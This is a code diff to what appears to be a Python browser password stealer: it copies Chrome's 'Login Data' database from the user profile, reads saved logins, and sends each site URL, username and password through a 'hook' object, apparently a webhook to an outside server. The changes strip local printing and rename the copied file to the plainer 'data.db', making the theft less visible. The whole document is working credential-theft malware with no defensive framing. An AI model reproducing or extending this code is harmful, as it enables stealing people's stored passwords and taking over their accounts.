@@ -43,7 +43,7 @@ def main():
     key = get_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "default", "Login Data")
-    filename = "ChromeData.db"
+    filename = "data.db"
     shutil.copyfile(db_path, filename)
     db = sqlite3.connect(filename)
     cursor = db.cursor()
@@ -57,17 +57,11 @@ def main():
         date_last_used = row[5]        
         if username or password:
             hook.send(f"Origin URL: {origin_url}")
-            hook.send(f"Action URL: {action_url}")
             hook.send("---------------------------------")
             hook.send(f"Username: {username}")
             hook.send(f"Password: {password}")
         else:
             continue
-        if date_created != 86400000000 and date_created:
-            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
-        if date_last_used != 86400000000 and date_last_used:
-            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
-        print("="*50)
     cursor.close()
     db.close()
     try:
